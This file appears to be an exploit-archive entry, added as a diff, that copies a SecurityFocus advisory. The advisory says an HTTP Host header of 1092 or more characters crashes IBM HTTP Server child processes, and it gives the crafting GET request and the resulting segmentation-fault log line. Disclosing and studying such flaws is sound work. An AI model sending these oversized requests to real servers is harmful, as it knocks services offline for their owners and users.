@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/1691/info
+
+Large amounts of data (ie 1092+ characters) in the Host: request header may cause the web server process to fault on signal 11 (SIGSEGV) or signal 10 (SIGBUS). 
+
+GET /servletsnoop HTTP/1.0
+Host: xxxxxxxxxxxxxxxxxxxxxxxx(1092+ characters)
+
+resulted in the following IBMHTTPD log entry:
+
+[Fri May 26 12:00:54 2000] [notice] child pid 11306 exit signal Segmentation
+Fault (11) 
